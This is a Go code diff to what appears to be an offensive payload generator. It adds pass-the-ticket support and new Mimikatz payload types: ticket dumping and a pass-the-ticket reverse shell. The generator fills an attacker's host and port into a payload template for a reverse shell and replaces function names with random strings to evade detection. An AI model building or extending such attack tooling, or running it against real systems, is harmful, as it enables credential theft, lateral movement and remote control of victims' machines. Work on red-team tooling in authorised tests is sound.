@@ -22,6 +22,9 @@ type StageTwoPayloadGeneratorModule struct {
 	domain string
 	ntlm   string
 
+	// ptt params
+	ticketFilename string
+
 	logger util.Logger
 }
 
@@ -63,7 +66,7 @@ func (stpgm *StageTwoPayloadGeneratorModule) preparePayloadSource() (string, err
 	payloadSource = strings.Replace(payloadSource, "HOST", stpgm.host, -1)
 	payloadSource = strings.Replace(payloadSource, "PORT", stpgm.port, -1)
 	var funcPatterns []string
-	if stpgm.payloadType == "mimikatz_hashdump" {
+	if stpgm.payloadType == "mimikatz_hashdump" || stpgm.payloadType == "mimikatz_ticketdump" {
 		funcPatterns = []string{
 			"RUNMIMIKATZ",
 			"GETHELPER",
@@ -89,6 +92,16 @@ func (stpgm *StageTwoPayloadGeneratorModule) preparePayloadSource() (string, err
 		payloadSource = strings.Replace(payloadSource, "USER", stpgm.user, -1)
 		payloadSource = strings.Replace(payloadSource, "DOMAIN", stpgm.domain, -1)
 		payloadSource = strings.Replace(payloadSource, "NTLM", stpgm.ntlm, -1)
+	}
+	if stpgm.payloadType == "mimikatz_ptt_reverse_shell" {
+		funcPatterns = []string{
+			"GETHELPER",
+			"WRITETOFILE",
+			"RUNMIMIKATZ",
+			"MIMIKATZFILENAME",
+			"REVERSESHELLNAME",
+		}
+		payloadSource = strings.Replace(payloadSource, "TICKETFILENAME", stpgm.ticketFilename, -1)
 	}
 	for _, funcPattern := range funcPatterns {
 		payloadSource = strings.Replace(payloadSource, funcPattern, util.RandString(util.RandInt()), -1)
@@ -129,4 +142,8 @@ func (stpgm *StageTwoPayloadGeneratorModule) SetPthParams(user, domain, ntlm str
 	stpgm.user = user
 	stpgm.domain = domain
 	stpgm.ntlm = ntlm
+}
+
+func (stpgm *StageTwoPayloadGeneratorModule) SetPttParams(ticketFilename string) {
+	stpgm.ticketFilename = ticketFilename
 }
